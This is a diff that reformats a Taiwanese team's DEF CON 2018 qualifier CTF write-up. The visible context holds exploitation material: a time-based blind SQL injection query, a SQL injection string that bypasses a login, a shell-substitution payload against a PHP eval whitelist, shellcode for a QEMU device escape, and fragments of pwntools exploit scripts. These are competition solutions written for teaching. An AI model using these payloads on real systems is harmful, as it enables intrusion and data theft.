@@ -2,10 +2,7 @@
 
 Written by BFS
 
-BFS consists of four CTF teams form Taiwan
-
-We are Balsn, Bamboofox, DoubleSigma, KerKerYuan
-
+BFS consists of four CTF teams form Taiwan: Balsn, Bamboofox, DoubleSigma, KerKerYuan.
 
 **It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20180512-defconctfqual/) of this writeup.**
 
@@ -37,8 +34,6 @@ We are Balsn, Bamboofox, DoubleSigma, KerKerYuan
 
 
 
-\* If you want to know the solution/writeup of the problems, you can dig it out in the #irc or refer to the [official repositiries](https://github.com/o-o-overflow/).
-
 ## Amuse Bouche
 
 ### ELF Crumble
@@ -46,7 +41,7 @@ Original binary in range 0x05ad ~ 0x08d3 is filled with `X`. Search through all 
 
 ### You Already Know - warmup
 * Open the problem -> F12 -> Network -> Reopen the problem -> See the flag.  
-```OOO{Sometimes, the answer is just staring you in the face. We have all been there}```
+`OOO{Sometimes, the answer is just staring you in the face. We have all been there}`
 
 ### Easy Pisy - crypto, web
 
@@ -72,6 +67,7 @@ Therefore, draw two command on picture,and put them into the pdf, Google release
 * Overwite `GOT read` with `onegadget` -> with probability 1/16 (correct libc).
 * `/opt/ctf/babypwn/home/flag`.
 * `OOO{to_know_the_libc_you_must_become_the_libc}`
+
 ```python=
 #!/usr/bin/env python
 from pwn import *
@@ -354,6 +350,7 @@ r.interactive()
 `SELECT 1 from flag where (select substring(flag,1,4) from flag) = "OOO{" and SLEEP(10);`
 
 * The exploit script:
+
 ```python
 # coding: utf-8
 from pwn import *
@@ -419,85 +416,88 @@ for i in range(4,70):
     * Class 3~13 doesn't start with `OOO`.
     * We guessed Class 2 is true flag, so we generate a lot of possible input images to get probabilities of each character at each position.
     * Code:
-    ```python
-    #!/usr/bin/python3
-    import sys
 
-    dim = int(sys.argv[1])
+```python
+#!/usr/bin/python3
+import sys
 
-    flag = '......................................'
+dim = int(sys.argv[1])
 
-    reset = False # Change to False when known part is long enough
-    #  flag = 'OOOOOOOOOOOOOOOOI.....................' # dim = 0
-    #  flag = 'OOOOTHISISA.....MESSAGETOWASTEYOURTIME' # dim = 1
-    flag = 'OOO.............INTELLIGENCEISREQUIRED' # dim = 2
+flag = '......................................'
 
-
-    import numpy as np
-    from PIL import Image
-    import os
-    from tqdm import tqdm, trange
-    import random
-    from keras.models import load_model, Model
+reset = False # Change to False when known part is long enough
+#  flag = 'OOOOOOOOOOOOOOOOI.....................' # dim = 0
+#  flag = 'OOOOTHISISA.....MESSAGETOWASTEYOURTIME' # dim = 1
+flag = 'OOO.............INTELLIGENCEISREQUIRED' # dim = 2
 
 
-    model = load_model('model.h5')
-    model = Model(input=model.input, output=model.layers[-2].output)
-
-    data = [np.asarray(Image.open('sample_%d.png' % i)).reshape(28, 1064).astype(np.float) for i in range(10)]
-    data = [im for d in data for im in np.split(d, 38, axis=1)]
-    char = ''.join([
-        'RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIUI',
-        'MOLDERINGIINTELSDEDICINGCOYNESSDEFIECT',
-        'AMADOFIFESINSTIIIINGGREEDIIVDISIOCATIN',
-        'HAMIETSENSITIZINGNARRATIVERECAPTURINGU',
-        'EIECTROENCEPHAIOGRAMSPALATECONDOIESPEN',
-        'SCHWINNUFAMANAGEABLECORKSSEMICIRCIESSH',
-        'BENEDICTTURGIDITYDSYCHESPHANTASMAGORIA',
-        'TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW',
-        'KINGFISHERCOMMONERSUERIFIESHORNETAUSTI',
-        'LIQUORHEMSTITCHESRESPITEACORNSGOALREDI',
-    ])
-    data = list(zip(data, char))
-
-    def softmax(x):
-        """Compute softmax values for each sets of scores in x."""
-        e_x = np.exp(x - np.max(x))
-        return e_x / e_x.sum()
+import numpy as np
+from PIL import Image
+import os
+from tqdm import tqdm, trange
+import random
+from keras.models import load_model, Model
 
 
-    for z in trange(100):
-        if reset or z == 0:
-            img, text = zip(*random.sample(data, 38))
-            img = np.concatenate(img, 1).reshape(1, 28, 1064, 1)
-            text = list(text)
-            r = model.predict([img])[0]
-            score = r[dim]
-        bar = trange(1000)
-        bar.desc = '%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)
-        for i in bar:
-            cur = img.copy()
-            while True:
-                idx = random.randrange(0, 38)
-                im, c = random.sample(data, 1)[0]
-                if text[idx] != flag[idx] or flag[idx] == c:
-                    break
-            cur[0,:, idx*28:(idx+1)*28,0] = im
-            r = model.predict([cur])[0]
-            s = r[dim]
-            if ( text[idx] != flag[idx] and flag[idx] == c ) or s > score or random.random() < (100/(i+100 + z *10)) ** 4:
-                text[idx] = c
-                bar.desc = '%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)
-                score = s
-                img = cur
-        tqdm.write(''.join(text))
-        bar.close()
-    ```
+model = load_model('model.h5')
+model = Model(input=model.input, output=model.layers[-2].output)
+
+data = [np.asarray(Image.open('sample_%d.png' % i)).reshape(28, 1064).astype(np.float) for i in range(10)]
+data = [im for d in data for im in np.split(d, 38, axis=1)]
+char = ''.join([
+    'RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIUI',
+    'MOLDERINGIINTELSDEDICINGCOYNESSDEFIECT',
+    'AMADOFIFESINSTIIIINGGREEDIIVDISIOCATIN',
+    'HAMIETSENSITIZINGNARRATIVERECAPTURINGU',
+    'EIECTROENCEPHAIOGRAMSPALATECONDOIESPEN',
+    'SCHWINNUFAMANAGEABLECORKSSEMICIRCIESSH',
+    'BENEDICTTURGIDITYDSYCHESPHANTASMAGORIA',
+    'TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW',
+    'KINGFISHERCOMMONERSUERIFIESHORNETAUSTI',
+    'LIQUORHEMSTITCHESRESPITEACORNSGOALREDI',
+])
+data = list(zip(data, char))
+
+def softmax(x):
+    """Compute softmax values for each sets of scores in x."""
+    e_x = np.exp(x - np.max(x))
+    return e_x / e_x.sum()
+
+
+for z in trange(100):
+    if reset or z == 0:
+        img, text = zip(*random.sample(data, 38))
+        img = np.concatenate(img, 1).reshape(1, 28, 1064, 1)
+        text = list(text)
+        r = model.predict([img])[0]
+        score = r[dim]
+    bar = trange(1000)
+    bar.desc = '%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)
+    for i in bar:
+        cur = img.copy()
+        while True:
+            idx = random.randrange(0, 38)
+            im, c = random.sample(data, 1)[0]
+            if text[idx] != flag[idx] or flag[idx] == c:
+                break
+        cur[0,:, idx*28:(idx+1)*28,0] = im
+        r = model.predict([cur])[0]
+        s = r[dim]
+        if ( text[idx] != flag[idx] and flag[idx] == c ) or s > score or random.random() < (100/(i+100 + z *10)) ** 4:
+            text[idx] = c
+            bar.desc = '%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)
+            score = s
+            img = cur
+    tqdm.write(''.join(text))
+    bar.close()
+```
+
 * Part 2
     * Use dictionary and trie to find all the possible sentences.
     * Dictionary: https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt
     * Remember to remove the useless words that length is in range 1~3.
     * Code:
+
         ```C++
         #include<bits/stdc++.h>
         #define f first
@@ -556,7 +556,9 @@ for i in range(4,70):
             return 0;
         }
         ```
+
     * input
+
         ```
         [The Dictionary]
         0
@@ -615,13 +617,14 @@ for i in range(4,70):
         OOOLDMEUMTURWYLCINTELLIGENCEISREQUIRED
         0
         ```
-    * Flag
-        ```OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED```
+    * Flag: `OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED`
+
 ### Note Oriented Programming
 * Setup the value on the stack and call sys_sigreturn
 * After that, eax = 0x3 ebx=0x0 ecx=0x6060654f edx=0x4f4f4f4f cs=0x23 ss=0x2b ds=0x2b
 * Now eip is 0x60606565 pointer to "int 0x80" to call sys_read
 * Then, write shellcode on the 0x6060654f to get shell
+
 ```python=
 from __future__ import print_function
 import sys
@@ -740,6 +743,7 @@ if __name__ == '__main__':
 * There is a buffer which is located at `0x1317940` and three kinds of operations
 * You can `malloc` `free` `write` some chunks. And all the chunk will be on that buffer
 * I list the write function here:
+
 ```c
 void __fastcall OOO_mmio_write(__int64 a1, __int64 offset, __int64 value, unsigned int a4)
 {
@@ -785,6 +789,7 @@ void __fastcall OOO_mmio_write(__int64 a1, __int64 offset, __int64 value, unsign
   }
 }
 ```
+
 * The operation will be determined by IO offset. When your write offset is 0xabXXXX. 
 * If a==1, then it will trigger free operation. 
 * If a==2, then it will trigger write operation.
@@ -800,6 +805,7 @@ void __fastcall OOO_mmio_write(__int64 a1, __int64 offset, __int64 value, unsign
 * Unfortunately we cannot upload a binary on remote vm, becasue the vm has no network connection. We can base64 encode our binary and send it to the vm. But the binary needs to be small enough, or you cannot send the whole binary because of network conditon.
 * So I write some shellcode for exploit.
 * The shellcode:
+
 ```nasm
 section .data
     msg db      "/sys/devices/pci0000:00/0000:00:04.0/resource0"
@@ -837,6 +843,7 @@ _start:
 # nasm -felf64 a.asm -o a.o && ld a.o && base64 a.out > shellcode
 ```
 * And the code to send shellcode:
+
 ```python
 import sys
 import struct
@@ -887,6 +894,7 @@ r.interactive()
 4. Use modify_transmission function to get relative address read/write capability of arbitrary memory
 5. Read heap address and code GOT address to get libc address, then modify exit GOT to one_gadget, call exit, and get shell
 * code:
+
 ```python=
 from pwn import *
 import sys
@@ -1087,6 +1095,7 @@ Our main objective is to make `get_user_id()` return 1, which is the admin's use
 Here is the evil input: `print("A"*112+"users where rowid=1;--")`
 
 The SQL query becomes:
+
 ```
 select rowid from users where rowid=1;-- where username = '...' and password = '...';
 ```
@@ -1127,7 +1136,7 @@ v11 = (__int64 (__fastcall *)(char *, __int64, int))sub_3220;
 
 ### PHP Eval White-List
 
-- run ``` die("`../flag`"); ```
+- run ` die("`../flag`"); `
 - `OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}`
 
 ### ghettohackers: Throwback
